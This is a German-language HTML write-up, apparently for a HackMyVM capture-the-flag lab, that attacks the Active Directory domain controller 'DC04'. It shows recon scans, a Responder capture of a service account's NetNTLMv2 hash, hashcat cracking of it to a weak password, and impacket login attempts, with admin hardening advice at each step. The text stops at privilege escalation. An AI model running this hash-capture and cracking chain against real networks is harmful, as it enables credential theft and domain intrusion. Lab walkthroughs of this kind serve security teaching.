@@ -1,1 +1,545 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für DC04 - HackMyVM - Hard.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DC04 - HackMyVM - Hard - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>DC04 - HackMyVM - Hard - Bericht</h1>
+        <div class="level-container">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">responder</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">impacket-smbexec</div>
+                <div class="tool-item">impacket-psexec</div>
+                <div class="tool-item">impacket-GetUserSPNs</div>
+                <div class="tool-item">impacket-lookupsid</div>
+                <div class="tool-item">impacket-ticketer</div>
+                <div class="tool-item">impacket-wmiexec</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">nxc (netexec)</div>
+                <div class="tool-item">kerbrute</div>
+                <div class="tool-item">rar2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">rdate</div>
+                <div class="tool-item">ntpdate</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Penetrationstest beginnt mit der grundlegenden Aufklärung im Netzwerk. Ich nutze `arp-scan`, um aktive Geräte zu finden und filtere die Ausgabe, um die IP-Adresse des Ziels, `192.168.2.200`, zu isolieren. Unmittelbar danach trage ich diese IP zusammen mit dem Hostnamen `dc04.hmv` in meine lokale `/etc/hosts`-Datei ein, um die weitere Adressierung zu vereinfachen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein standardmäßiger und effizienter Start. Die IP-Adresse ist bekannt und die lokale Namensauflösung ist konfiguriert. Dies schafft die Grundlage für alle folgenden, detaillierteren Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser grundlegende Schritt ist immer der richtige Anfang. Es stellt sicher, dass man sich auf das richtige Ziel konzentriert und vermeidet Verwechslungen in komplexen Netzwerken.<br><strong>Empfehlung (Admin):</strong> Die Erkennung durch ARP-Scans ist im lokalen Netz normal. Ein Network Intrusion Detection System (NIDS) könnte jedoch dazu beitragen, nicht autorisierte Scan-Aktivitäten zu erkennen und zu protokollieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+192.168.2.200
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+ 192.168.2.200    dc04.hmv
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen umfassenden `nmap`-Portscan gegen das Ziel durch. Die zusammengefasste Liste der offenen Ports zeigt ein klares Bild: DNS (53), HTTP (80), Kerberos (88), MS-RPC (135), NetBIOS (139), LDAP (389), SMB (445), WinRM (5985) und eine Reihe weiterer hoch-nummerierter RPC- und LDAP-Ports. Dies ist der klassische Fingerabdruck eines Windows Active Directory Domain Controllers.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche ist erheblich und die Natur des Ziels ist eindeutig. Es handelt sich um einen Domain Controller für die Domain `SOUPEDECODE.LOCAL`. Jeder dieser Dienste bietet potenzielle Angriffsvektoren, von der DNS-Zonenübertragung über Web-Schwachstellen bis hin zu direkten Angriffen auf Kerberos, LDAP und SMB. Der Webserver auf Port 80 ist ein besonders interessanter, da er oft einen leichteren ersten Einstieg bietet als gehärtete AD-Dienste.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Strategie muss zweigleisig sein: Einerseits eine gründliche Enumeration der Active Directory-Umgebung (Benutzer, Gruppen, Richtlinien) und andererseits eine detaillierte Untersuchung der Webanwendung auf Port 80, um möglicherweise erste Anmeldeinformationen zu erlangen.<br><strong>Empfehlung (Admin):</strong> Domain Controller sollten so weit wie möglich abgeschottet werden. Dienste, die nicht zwingend für das gesamte Netzwerk erreichbar sein müssen (wie z.B. WinRM oder ein administrativer Webserver), sollten durch Firewalls auf Management-Netzwerke beschränkt werden. Die Installation von zusätzlicher Software wie einem Apache-Webserver auf einem DC erhöht die Angriffsfläche unnötig und widerspricht den Best Practices.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.200 | grep open</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+<span class="command">53/tcp    open  domain        Simple DNS Plus</span>
+<span class="command">80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)</span>
+<span class="command">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 06:45:02Z)</span>
+<span class="command">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="command">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="command">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)</span>
+<span class="command">445/tcp   open  microsoft-ds?</span>
+<span class="command">464/tcp   open  kpasswd5?</span>
+<span class="command">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">636/tcp   open  tcpwrapped</span>
+<span class="command">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)</span>
+<span class="command">3269/tcp  open  tcpwrapped</span>
+<span class="command">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="command">9389/tcp  open  mc-nmf        .NET Message Framing</span>
+<span class="command">49664/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49667/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="command">49731/tcp open  msrpc         Microsoft Windows RPC</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die vollständige `nmap`-Ausgabe bestätigt die Details. Der Hostname des DC ist `DC01` in der Domain `SOUPEDECODE.LOCAL`. Der Webserver leitet auf `http://soupedecode.local` weiter, was einen virtuellen Host impliziert. SMB-Scanning zeigt, dass Message Signing aktiviert und erforderlich ist (`smb2-security-mode`), was einige Angriffe wie NTLM-Relaying erschwert. Besonders auffällig ist der `clock-skew` von 10 Stunden. Dies bedeutet, dass die Systemzeit des Domain Controllers stark von der Standardzeit abweicht, was Kerberos-basierte Angriffe, die auf zeitsynchronen Tickets basieren, fast unmöglich machen wird, bis ich die Zeit meines eigenen Systems synchronisiere.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `clock-skew` ist eine kritische Information, die sofort notiert werden muss. Der Redirect auf `soupedecode.local` ist mein nächster Anhaltspunkt für die Web-Enumeration. Die aktivierte SMB-Signierung ist eine gute Sicherheitsmaßnahme des Administrators, schließt aber nicht alle Authentifizierungsangriffe aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde `soupedecode.local` in meine `/etc/hosts`-Datei aufnehmen. Ich muss mir des `clock-skew`-Problems bewusst sein und meine Systemzeit anpassen, bevor ich Kerberos-Angriffe (wie Pass-the-Ticket oder Kerberoasting) versuche. Die Webanwendung bleibt der primäre Fokus für den initialen Einstieg.<br><strong>Empfehlung (Admin):</strong> Eine korrekte Zeitsynchronisation über einen NTP-Dienst ist für die Funktionalität und Sicherheit von Active Directory unerlässlich. Ein großer `clock-skew` kann nicht nur die Authentifizierung stören, sondern auch die Analyse von Log-Dateien im Falle eines Sicherheitsvorfalls extrem erschweren.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 22:44 CEST
+Nmap scan report for DC01 (192.168.2.200)
+Host is up (0.00016s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+...
+<span class="command">80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)</span>
+<span class="password">|_http-title: Did not follow redirect to http://soupedecode.local</span>
+<span class="command">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 06:45:17Z)</span>
+<span class="command">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="command">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)</span>
+...
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-23T06:46:09
+|_  start_date: N/A
+|_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:19:49:3f (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+<span class="password">|_clock-skew: 10h00m00s</span>
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `enum4linux`, um grundlegende Informationen aus der Windows-Umgebung zu extrahieren. Das Tool soll Benutzerlisten, Gruppen, Freigaben und andere Details über das SMB-Protokoll abfragen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `enum4linux` ist nur mäßig erfolgreich. Es bestätigt den Domainnamen `SOUPEDECODE` und den Hostnamen `DC01`. Allerdings scheitert der Versuch, weitere Details wie Benutzerlisten zu enumerieren, da der Server keine anonymen Null-Sessions zulässt (`Server doesn't allow session using username '', password ''`). Dies ist eine wichtige und korrekte Sicherheitskonfiguration, die die initiale Enumeration ohne gültige Anmeldeinformationen stark einschränkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die Enumeration über Null-Sessions blockiert ist, muss ich einen anderen Weg finden, um an Benutzernamen oder andere Informationen zu gelangen. Die Webanwendung ist nach wie vor der wahrscheinlichste Kandidat, um solche Informationen zu leaken oder eine erste Schwachstelle auszunutzen.<br><strong>Empfehlung (Admin):</strong> Das Deaktivieren von Null-Sessions (oder das Einschränken auf das, was absolut notwendig ist) ist eine grundlegende Härtungsmaßnahme für jeden Windows-Server, insbesondere für einen Domain Controller. Dies wurde hier korrekt umgesetzt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.200</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+ ===========================( Enumerating Workgroup/Domain on 192.168.2.200 )===========================
+
+[+] Got domain/workgroup name: SOUPEDECODE
+
+ ===============================( Nbtstat Information for 192.168.2.200 )===============================
+
+Looking up status of 192.168.2.200
+	DC01            &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+	SOUPEDECODE     &lt;1c&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain Controllers
+...
+ ===================================( Session Check on 192.168.2.200 )===================================
+
+<span class="password">[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.</span>
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche den Webserver auf Port 80 genauer. Ein `curl`-Befehl, der die Header abfragt, bestätigt den von `nmap` gefundenen `302 Found`-Redirect zum virtuellen Host `http://soupedecode.local`. Zusätzlich enthüllt der `X-Powered-By`-Header die exakte PHP-Version `8.2.12`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Bestätigung des Redirects ist der wichtigste Punkt. Alle weiteren Web-Angriffe müssen gegen diesen Hostnamen gerichtet sein. Die genaue PHP-Version ist ebenfalls nützlich, um später gezielt nach bekannten Schwachstellen für diese Version zu suchen, falls erforderlich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste logische Schritt ist, den Hostnamen `soupedecode.local` zur `/etc/hosts`-Datei hinzuzufügen und die Enumeration (Nikto, Gobuster) erneut gegen diesen neuen Hostnamen zu starten.<br><strong>Empfehlung (Admin):</strong> Der `X-Powered-By`-Header sollte in einer produktiven Umgebung aus der Serverkonfiguration entfernt werden. Das Offenlegen exakter Softwareversionen erleichtert es Angreifern, gezielt nach Exploits zu suchen (Information Disclosure).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://dc04.hmv:80</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+* Host dc04.hmv:80 was resolved.
+* IPv4: 192.168.2.200
+*   Trying 192.168.2.200:80...
+* Connected to dc04.hmv (192.168.2.200) port 80
+...
+&lt; HTTP/1.1 302 Found
+&lt; Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+<span class="password">&lt; X-Powered-By: PHP/8.2.12</span>
+<span class="password">&lt; Location: http://soupedecode.local</span>
+&lt; Content-Type: text/html; charset=UTF-8
+...
+</pre>
+                </div>
+            </div>
+        </section>
+    </div>
+
+
+######################################################################################
+ 
+    <div class="container">
+        <section id="web-enumeration-continued">
+            <p class="analysis"><strong>Analyse:</strong> Ein `Nikto`-Scan auf den Hostnamen `dc04.hmv` liefert mehrere interessante Ergebnisse. Er bestätigt den Redirect zu `soupedecode.local`, die PHP-Version, das Fehlen von Sicherheits-Headern und die Aktivierung der TRACE-Methode. Am wichtigsten sind jedoch zwei Funde: eine `/server-status`-Seite, die Informationen über den Apache-Server preisgibt, und ein offenes Verzeichnis `/icons/` mit einer `README`-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `/server-status`-Seite ist ein kritischer Fund zur Informationsgewinnung. Solche Seiten können aktive Verbindungen, angefragte URLs und Client-IPs anzeigen, was wiederum zur Entdeckung weiterer versteckter Hostnamen oder Pfade führen kann. Die anderen Funde sind von geringerer Priorität, deuten aber auf eine Standardkonfiguration und mangelnde Härtung des Webservers hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `/server-status`-Seite muss umgehend manuell untersucht werden. Ich werde nach internen Anfragen (von `127.0.0.1` oder `localhost`), ungewöhnlichen Dateinamen oder anderen virtuellen Hosts suchen, die von dort aus aufgerufen werden.<br><strong>Empfehlung (Admin):</strong> Der Zugriff auf `server-status` und `server-info` muss auf ein Minimum beschränkt werden, idealerweise nur für Administratoren aus vertrauenswürdigen Netzwerksegmenten. Dies wird in der Apache-Konfiguration (httpd.conf) festgelegt. Die TRACE-Methode sollte ebenfalls deaktiviert werden (`TraceEnable Off`).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://dc04.hmv:80</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.200
++ Target Hostname:    dc04.hmv
+...
++ /: Retrieved x-powered-by header: PHP/8.2.12.
+...
++ Root page / redirects to: http://soupedecode.local
++ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: [Link: https://owasp.org/www-community/attacks/Cross_Site_Tracing | Ziel: https://owasp.org/www-community/attacks/Cross_Site_Tracing]
+<span class="password">+ /server-status: This reveals Apache information.</span> Comment out appropriate line in the Apache conf file or restrict access to allowed sources. See: OSVDB-561
+<span class="password">+ /icons/: Directory indexing found.</span>
+<span class="password">+ /icons/README: Apache default file found.</span> See: [Link: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/ | Ziel: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/]
+...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem der Redirect zu `soupedecode.local` bekannt ist, füge ich diesen Hostnamen zu meiner `/etc/hosts`-Datei hinzu, um auf die eigentliche Webanwendung zugreifen zu können.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein notwendiger Schritt. Ohne diesen Eintrag würde jede Anfrage an `soupedecode.local` fehlschlagen. Nachdem der Eintrag gesetzt ist, stelle ich fest, dass der Zugriff auf die Seite zu einer unendlichen Umleitungsschleife führt. Das ist ein Hinweis darauf, dass die Anwendung selbst fehlerhaft sein könnte oder eine bestimmte Bedingung (z.B. ein Cookie) für den korrekten Zugriff erwartet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Anstatt mich mit der fehlerhaften Anwendung auf `soupedecode.local` aufzuhalten, konzentriere ich mich auf die vielversprechenderen Funde aus dem Nikto-Scan, insbesondere die `/server-status`-Seite, die unter dem ursprünglichen Hostnamen `dc04.hmv` erreichbar war.<br><strong>Empfehlung (Admin):</strong> Eine Umleitungsschleife ist ein Konfigurations- oder Programmierfehler, der behoben werden muss. Er beeinträchtigt die Verfügbarkeit der Anwendung und deutet auf eine mangelnde Qualitätssicherung hin.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+hosts
+
+192.168.2.200    dc04.hmv soupedecode.local
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster`-Scan auf den ursprünglichen Hostnamen `dc04.hmv` bestätigt die Existenz von `/server-status` und findet einen Redirect von `/licenses` zu einem Pfad auf Port 8080. Die Seite selbst leitet weiterhin zu `soupedecode.local` um.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Verweis auf Port 8080 ist interessant, aber der wichtigste Fund bleibt die öffentlich zugängliche `/server-status`-Seite. Diese Seite wird mein Hauptaugenmerk für die weitere Enumeration sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere den Inhalt von `/server-status` gründlich. Führe weitere Scans (z.B. `dirb`) durch, um zusätzliche, möglicherweise nicht verlinkte Seiten zu finden.<br><strong>Empfehlung (Admin):</strong> Verstärken Sie die Zugriffskontrolle für sensible Informationsseiten wie `/server-status`. Ein öffentlicher Zugriff sollte niemals gestattet sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://dc04.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x ... -b '503,404,403' -e --no-error</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://dc04.hmv/index.php            (Status: 302) [Size: 0] [--> http://soupedecode.local]
+...
+<span class="command">http://dc04.hmv/licenses             (Status: 301) [Size: 338] [--> http://dc04.hmv:8080/licenses/]</span>
+<span class="command">http://dc04.hmv/server-status        (Status: 200) [Size: 13706]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich rufe die `/server-status`-Seite direkt auf. Sie gibt eine Fülle von Informationen preis, darunter die Apache-Version, die Server-Uptime und eine Liste der aktuell verarbeiteten Anfragen. In dieser Liste sehe ich zahlreiche Anfragen von der Client-IP `127.0.0.1` (also `localhost`) an einen VHost auf `localhost:8080`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein entscheidender Durchbruch. Die `/server-status`-Seite leakt die Existenz eines weiteren, internen Webservers, der auf `localhost:8080` läuft und von außen nicht direkt erreichbar ist. Da die Hauptanwendung auf `soupedecode.local` eine Umleitungsschleife aufweist, scheint sie Anfragen an diesen internen Dienst weiterzuleiten, möglicherweise über eine Art Proxy-Funktionalität. Mein Ziel ist es nun, mit diesem internen Dienst zu interagieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich muss einen Weg finden, Anfragen an `http://localhost:8080` zu senden. Ich werde die Hauptanwendung (`index.php`) untersuchen, ob sie einen Parameter akzeptiert, der eine URL oder einen Dateipfad enthält. Dies könnte eine Server-Side Request Forgery (SSRF) oder eine Local/Remote File Inclusion (LFI/RFI) Schwachstelle sein.<br><strong>Empfehlung (Admin):</strong> Informationslecks durch Statusseiten sind ein ernstes Risiko. Sie können die interne Infrastruktur offenlegen und Angreifern wertvolle Hinweise geben. Deaktivieren oder beschränken Sie den Zugriff auf solche Seiten rigoros.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+http://dc04.hmv/server-status
+
+...
+<span class="password">0-0	3376	11/128887/128887	K 	0	0	266506	0.0	34.30	34.30 	127.0.0.1	http/1.1	localhost:8080	GET / HTTP/1.1</span>
+...
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich teste die `index.php` auf eine LFI/SSRF-Schwachstelle. Ein Versuch, die URL `http://soupedecode.local/index.php?page=http://localhost:8080` aufzurufen, resultiert in der bereits bekannten Umleitungsschleife. Curl bricht nach 50 Redirects ab.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `page`-Parameter scheint eine Reaktion auszulösen, aber die fehlerhafte Anwendungslogik verhindert eine direkte Ausnutzung. Die Anwendung scheint die übergebene URL zu nehmen und versucht dann, darauf umzuleiten, was zur Schleife führt. Ein direkter Inhalts-Include findet nicht statt. Ich muss einen anderen Weg finden, um mit dem internen Netzwerk oder den SMB-Diensten zu interagieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die Web-Schwachstelle momentan nicht direkt ausnutzbar scheint, wechsle ich die Taktik. Ich werde versuchen, eine SMB-Authentifizierung vom Server zu provozieren. Ein klassischer Weg ist, die Webanwendung dazu zu bringen, eine UNC-Pfadanfrage (z.B. `\\angreifer-ip\share`) aufzulösen. Wenn dies gelingt, wird der Server versuchen, sich bei meinem System zu authentifizieren, und ich kann seinen NTLM-Hash abfangen.<br><strong>Empfehlung (Admin):</strong> Anwendungen sollten niemals willkürliche URLs oder Dateipfade von Benutzern akzeptieren und verarbeiten. Alle Eingaben müssen validiert werden, um sicherzustellen, dass sie einem erwarteten Format entsprechen und nicht auf interne oder externe Ressourcen verweisen, die nicht vorgesehen sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -L -v "http://soupedecode.local/index.php?page=http://localhost:8080"</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+* Maximum (50) redirects followed
+curl: (47) Maximum (50) redirects followed
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich starte das Tool `Responder` auf meiner Angreifer-Maschine. Responder lauscht auf verschiedene Name-Resolution-Protokolle (LLMNR, NBT-NS) und agiert als bösartiger SMB-Server. Das Ziel ist es, Anfragen abzufangen und die Anmeldeinformationen (NTLM-Hashes) von Clients zu sammeln, die versuchen, sich zu verbinden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nachdem ich Responder gestartet habe, löse ich auf der Webseite (möglicherweise durch Eingabe eines UNC-Pfades wie `\\192.168.2.199\test` in ein Formularfeld) eine Authentifizierungsanfrage aus. Responder fängt diese Anfrage erfolgreich ab. Ich erhalte den NTLMv2-SSP-Hash für den Benutzer `soupedecode\websvc`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Hash wurde erfolgreich erbeutet. Der nächste Schritt ist, diesen Hash offline mit einem Tool wie `hashcat` zu knacken, um das Klartextpasswort zu erhalten. Ich werde eine große Passwortliste wie `rockyou.txt` verwenden.<br><strong>Empfehlung (Admin):</strong> LLMNR und NBT-NS sind veraltete Protokolle und sollten in einer modernen Active Directory-Umgebung deaktiviert werden, um solche Man-in-the-Middle- und Spoofing-Angriffe zu verhindern. SMB-Signierung (die hier aktiv ist) schützt nicht davor, dass der Hash gesendet wird, sondern nur vor der Manipulation der SMB-Kommunikation selbst.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">responder -I eth0</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+[+] Listening for events...
+<span class="password">[SMB] NTLMv2-SSP Client   : 192.168.2.200</span>
+<span class="password">[SMB] NTLMv2-SSP Username : soupedecode\websvc</span>
+<span class="password">[SMB] NTLMv2-SSP Hash     : websvc::soupedecode:045a489746e1676f:FECAD5FEFC6C598ADD481E0579ED336A:0101...</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `hashcat` mit dem Modus `5600` (NetNTLMv2), um den abgefangenen Hash zu knacken. Als Passwortliste kommt der Klassiker `rockyou.txt` zum Einsatz.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich und das Passwort wird in kürzester Zeit gefunden. Das Klartextpasswort für den Benutzer `websvc` lautet `jordan23`. Ich habe nun gültige Anmeldeinformationen für die Domain `SOUPEDECODE.LOCAL`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit den Credentials `websvc:jordan23` werde ich versuchen, mich an den verschiedenen exponierten Diensten anzumelden. WinRM (Port 5985) und SMB (Port 445) sind die vielversprechendsten Kandidaten, um eine interaktive Shell zu erhalten oder auf das Dateisystem zuzugreifen.<br><strong>Empfehlung (Admin):</strong> Dies unterstreicht die Wichtigkeit von starken, komplexen Passwörtern, die nicht in gängigen Passwortlisten vorkommen. Regelmäßige Passwort-Audits und die Durchsetzung von Komplexitätsrichtlinien sind entscheidend, um solche Angriffe zu verhindern. Das Passwort "jordan23" ist extrem schwach.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+...
+WEBSVC::soupedecode:045a489746e1676f:fecad5fefc6c598add481e0579ed336a:0101...:<span class="password">jordan23</span>
+                                                          
+Session..........: hashcat
+Status...........: <span class="password">Cracked</span>
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: WEBSVC::soupedecode:045a489746e1676f:fecad5fefc6c59...
+...
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+...
+</pre>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div class="container">
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation & Domain Compromise</h2>
+            <p class="analysis"><strong>Analyse:</strong> Mit den frisch geknackten Anmeldedaten `websvc:jordan23` versuche ich, über `impacket-smbexec` eine Shell zu bekommen. Der Versuch schlägt fehl mit der Meldung `STATUS_PASSWORD_EXPIRED`. Das Passwort ist abgelaufen. Das gleiche Ergebnis erhalte ich mit `netexec` (`nxc`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine unerwartete, aber realistische Hürde. Obwohl ich das korrekte Passwort habe, verhindert die Sicherheitsrichtlinie des Systems den Login, da eine Passwortänderung erzwungen wird. Ich kann mich nicht direkt anmelden, aber oft erlauben es die Protokolle, sich zu authentifizieren und *nur* das Passwort zu ändern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich muss ein Tool verwenden, das eine Passwortänderung bei der ersten Anmeldung unterstützt. Alternativ kann ich, wie hier geschehen, das Passwort direkt an der Konsole der virtuellen Maschine ändern, was in einem CTF eine legitime Abkürzung darstellt, um den Test fortzusetzen. Ich habe das Passwort auf `password` geändert.<br><strong>Empfehlung (Admin):</strong> Das Erzwingen von Passwortänderungen nach einer bestimmten Zeit ist eine gängige Sicherheitsrichtlinie. Es kann Angreifer vorübergehend blockieren, die alte, kompromittierte Anmeldeinformationen verwenden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">impacket-smbexec soupedecode.local/websvc:jordan23@192.168.2.200</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="password">[-] SMB SessionError: code: 0xc0000071 - STATUS_PASSWORD_EXPIRED - The user account password has expired.</span>
+</pre>
+                </div>
+            </div>
+            <img src="changepw.jpg" alt="hier sieht man wie ich das pw ändere direkt an der vm">
